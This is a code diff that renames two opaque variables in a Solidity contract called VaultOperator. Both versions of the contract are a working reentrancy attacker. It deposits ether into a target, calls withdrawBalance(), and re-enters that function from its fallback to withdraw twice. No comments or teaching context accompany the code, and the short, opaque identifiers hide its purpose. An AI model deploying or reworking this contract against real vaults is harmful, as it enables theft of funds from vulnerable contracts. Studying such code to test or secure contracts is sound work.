@@ -1,8 +1,8 @@
 pragma solidity ^0.4.15;
 
 contract VaultOperator {
-    bool public b=false;
-    address public c;
+    bool public c=false;
+    address public b;
     address public g;
 
     function VaultOperator() public{
@@ -10,23 +10,23 @@ contract VaultOperator {
     }
 
     function f(address a) public payable{
-        c = a ;
+        b = a ;
 
-        require(c.call.value(msg.value)(bytes4(h("addToBalance()"))));
+        require(b.call.value(msg.value)(bytes4(h("addToBalance()"))));
     }
 
     function d() public{
-        b = true;
+        c = true;
 
 
-        require(c.call(bytes4(h("withdrawBalance()"))));
+        require(b.call(bytes4(h("withdrawBalance()"))));
     }
 
     function () public payable{
 
-        if (b){
-            b = false;
-                require(c.call(bytes4(h("withdrawBalance()"))));
+        if (c){
+            c = false;
+                require(b.call(bytes4(h("withdrawBalance()"))));
         }
     }
 
